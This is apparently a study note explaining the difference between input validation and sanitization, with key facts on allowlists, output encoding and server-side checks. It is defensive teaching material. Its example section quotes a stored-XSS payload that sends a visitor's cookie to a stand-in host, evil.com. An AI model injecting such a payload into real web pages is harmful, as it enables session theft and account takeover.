# Input Sanitization vs Validation

## What it is
Think of a bouncer at a club: *validation* checks your ID to confirm you're allowed in (accept or reject), while *sanitization* is the coat-check stripping away anything dangerous before you enter (transform or neutralize). Validation verifies that input conforms to expected rules (type, length, format, range), while sanitization actively modifies or escapes input to remove or neutralize harmful characters or sequences. Both are distinct defenses — validation is a binary gate, sanitization is a disarming process.

## Why it matters
In a classic stored XSS attack, an attacker submits `<script>document.location='http://evil.com/?c='+document.cookie</script>` into a comment field. Validation alone might fail if the app accepts arbitrary text by design — sanitization must strip or HTML-encode the script tags before the payload reaches the database and gets served to other users. Applications that rely solely on one mechanism without the other remain exploitable.

## Key facts
- **Validation** is about *allowing* or *rejecting* — it does not change the data, only decides if it's acceptable.
- **Sanitization** is about *transforming* — encoding `<` as `&lt;`, stripping null bytes, removing SQL metacharacters.
- Input validation alone is insufficient against XSS and SQLi; sanitization (output encoding) is the actual neutralizer.
- Allowlists (whitelists) are considered stronger than denylists for both techniques — denylist-based sanitization is easily bypassed with encoding tricks.
- Server-side validation is mandatory; client-side validation is a UX convenience, not a security control, and is trivially bypassed with tools like Burp Suite.

## Related concepts
[[Cross-Site Scripting (XSS)]] [[SQL Injection]] [[Output Encoding]] [[Allowlist vs Denylist]] [[OWASP Input Validation Cheat Sheet]]